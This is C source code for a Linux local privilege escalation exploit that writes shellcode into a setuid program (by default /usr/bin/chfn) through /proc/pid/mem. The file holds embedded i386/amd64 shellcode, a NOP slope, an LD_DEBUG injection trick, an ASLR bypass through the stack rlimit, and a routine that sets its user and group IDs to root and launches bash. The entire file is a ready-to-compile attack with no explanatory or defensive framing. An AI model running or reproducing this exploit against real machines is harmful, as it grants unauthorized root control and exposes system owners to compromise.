
#define _GNU_SOURCE
#include <sys/resource.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <fcntl.h>
#include <elf.h>

#define SENDER_ARG0 "/SENDER/"

static char shellcode[] = /* multi-arch i386 / amd64 */
	"\x31\xc9\x31\xf6\x31\xc0\x99\x6a\x35\x48\x8d\x3c\x24\x89\xe3\x79"
	"\x06\x40\xb0\x0b\xcd\x80\xcc\xb0\x3b\x0f\x05\xcc\x00" ;

static char nop = '\x90';

static char *default_target = "/usr/bin/chfn";

static void die(const char *s)
{
	perror(s);
	abort();
}

static pid_t ptrace_process(char *target)
{
	pid_t pid;

	if ( (pid = fork()) == 0 )
	{
		/* force disabling setuid */
		ptrace(PTRACE_TRACEME, 0, NULL, NULL);
		execl(target, target, NULL);
	}
	wait(NULL);

	return pid;
}

static void ptrace_kill(pid_t pid)
{
	kill(pid, SIGKILL);
	wait(NULL);
}

void *ptrace_peek_memcpy(pid_t pid, char *dest, char *src, size_t n)
{
	size_t off = 0, align = (size_t)src & (sizeof(long)-1), n_copy;
	union { char buf[sizeof(long)]; long val; } peek;

	while (off < n)
	{
		peek.val = ptrace(PTRACE_PEEKDATA, pid, &src[off-align], 0);

		n_copy = sizeof(long)-align;
		if (n_copy > n-off)
			n_copy = n-off;

		memcpy(&dest[off], &peek.buf[align], n_copy);
		off += n_copy;
		align = 0;
	}

	return dest;
}

static unsigned long read_bin_entry(pid_t pid, unsigned long base, int *dyn)
{
	char class; ptrace_peek_memcpy(pid, &class, (char *)base+EI_CLASS, 1);
	short type; ptrace_peek_memcpy(pid, (char*)&type, (char *)base+EI_NIDENT, 2);

	int is_64 = (class == ELFCLASS64), is_dyn = (type == ET_DYN);

	char peek[ is_64 ? 8 : 4 ]; memset(peek, 0, sizeof(peek));

	unsigned long entry_off = is_64 ? offsetof(Elf64_Ehdr,e_entry) :
	                                  offsetof(Elf32_Ehdr,e_entry) ;

	ptrace_peek_memcpy(pid, peek, (char *)base + entry_off, sizeof(peek));

	if (dyn) *dyn = is_dyn;

	return ( is_dyn ? base : 0 ) +
	       ( is_64 ? *(uint64_t*)peek : *(uint32_t*)peek );
}

static unsigned long read_bin_base(pid_t pid, char *target)
{
	char buf[4096];
	sprintf(buf, "/proc/%u/maps", pid);

	unsigned long base = 0;
	FILE *f = fopen(buf, "r");
	if (!f)
		die(__func__);

	while (fgets(buf, sizeof(buf), f))
		if ( strstr(buf, target) &&
		     sscanf(buf, "%lx", &base) == 1 )
			break;

	fclose(f);

	return base;
}

static int get_ld_debug_err_prefixlen(void)
{
	char buf[4096], *p;
	int len = -1;
	FILE *f = popen("LD_DEBUG=EPIC_FAIL /bin/true 2>&1", "r");

	if ( !f )
		return len;

	if ( fgets(buf, sizeof(buf), f) && (p = strstr(buf, "EPIC_FAIL")) )
		len = p-buf;

	fclose(f);

	return len;
}

static unsigned long get_bin_base(char *target)
{
	pid_t pid = ptrace_process(target);
	unsigned long base = read_bin_base(pid, target);
	ptrace_kill(pid);
	return base;
}

static unsigned long ptrace_get_stackpointer(pid_t pid)
{
	struct user_regs_struct regs;
	ptrace(PTRACE_GETREGS, pid, NULL, &regs);
#if __WORDSIZE == 64
	return regs.rsp;
#else
	return regs.esp;
#endif
}

static unsigned long ptrace_get_auxv(pid_t pid, long key)
{
	unsigned long *sp = (unsigned long *)ptrace_get_stackpointer(pid);

	sp++;
	while ( ptrace(PTRACE_PEEKDATA, pid, sp, 0) != 0 )
		sp++;
	sp++;
	while ( ptrace(PTRACE_PEEKDATA, pid, sp, 0) != 0 )
		sp++;
	sp++;
	while ( ptrace(PTRACE_PEEKDATA, pid, sp, 0) != key )
		sp+=2;
	sp++;
	return ptrace(PTRACE_PEEKDATA, pid, sp, 0);
}

static unsigned long get_bin_entry(char *target, int *dyn)
{
	pid_t pid = ptrace_process(target);
	unsigned long base = read_bin_base(pid, target);
	unsigned long entry;

	if (dyn)
		*dyn = 1; /* hmmz */

	if (base != 0)
		entry = read_bin_entry(pid, base, dyn);
	else
		entry = ptrace_get_auxv(pid, AT_ENTRY);

	ptrace_kill(pid);
	return entry;
}

static void send_fd(int sockfd, int fd)
{
    char buf[1];
    struct iovec iov[1] = { { buf, sizeof(buf) } };
	struct { struct cmsghdr hdr; int fd; } __attribute__((packed)) cmsg =
	{
		.hdr = {
			.cmsg_level = SOL_SOCKET,
			.cmsg_type = SCM_RIGHTS,
			.cmsg_len = sizeof(cmsg),
		},
		.fd = fd,
	};
    struct msghdr msg =
	{
		.msg_iov = iov,
		.msg_iovlen = 1,
		.msg_control = &cmsg,
		.msg_controllen = sizeof(cmsg),
	};

	if (sendmsg(sockfd, &msg, 0) < 0)
		die(__func__);
}

static int recv_fd(int sockfd)
{
    char buf[1];
    struct iovec iov[1] = { { buf, sizeof(buf) } };
	struct { struct cmsghdr hdr; int fd; } __attribute__((packed)) cmsg;
    struct msghdr msg =
	{
		.msg_iov = iov,
		.msg_iovlen = 1,
		.msg_control = &cmsg,
		.msg_controllen = sizeof(cmsg),
	};

	if (recvmsg(sockfd, &msg, 0) < 0)
		die(__func__);

	return cmsg.fd;
}

static void move_fd(int old, int new)
{
	if ( old != new )
	{
		dup2(old, new);
		close(old);
	}
}

static void spawn_rootshell(void)
{
	close(5);
	dup2(1,2);
	chdir("/");
	setresuid(0,0,0);
	setresgid(0,0,0);
	execl("/bin/bash", "bash", NULL);
}

static int get_child_memfd(void)
{
	int filedes[2];
	socketpair(AF_UNIX, SOCK_STREAM, 0, filedes);

	if ( fork() == 0 )
	{
		move_fd(filedes[0], 1);
		execl("../exe", SENDER_ARG0, NULL);
	}

	int memfd = recv_fd(filedes[1]);
	wait(NULL);
	close(filedes[0]);
	close(filedes[1]);
	return memfd;
}

static void do_exploit(char *target)
{
	chdir("/proc/self/fd/");

	move_fd(get_child_memfd(), 2);
	move_fd(open("../exe", O_RDONLY), 5);

	char slope[0x2000-0x80]; memset(slope, nop, sizeof(slope));
	memcpy(&slope[sizeof(slope)-sizeof(shellcode)], shellcode, sizeof(shellcode));
	lseek(2, get_bin_base(target), SEEK_SET);
	execl(target, slope, slope, NULL);
}

static void do_exploit2(char *target)
{
	int is_dyn = 0;

	chdir("/proc/self/fd/");

	move_fd(get_child_memfd(), 2);
	move_fd(open("../exe", O_RDONLY), 5);

	/* disable ASLR */
	setrlimit(RLIMIT_STACK, &(struct rlimit) { RLIM_INFINITY, RLIM_INFINITY } );
	lseek(2, get_bin_entry(target, &is_dyn)-get_ld_debug_err_prefixlen(), SEEK_SET);
	setenv("LD_DEBUG", shellcode, 1);

	// PIE
	//while ( is_dyn && fork() )
	//	wait(NULL);

	execl(target, target, "--help", NULL);
}

int main(int argc, char **argv)
{
	if ( argc == 0 )                              /* callback                 */
		spawn_rootshell();
	else if ( strcmp(argv[0], SENDER_ARG0) == 0 ) /* open /proc/pid/mem child */
		send_fd(1, open("../mem", O_RDWR));
	else                                          /* main exploit             */
//		do_exploit( (argc > 1) ? argv[1] : default_target );
		do_exploit2( (argc > 1) ? argv[1] : default_target );

	exit(0);
}

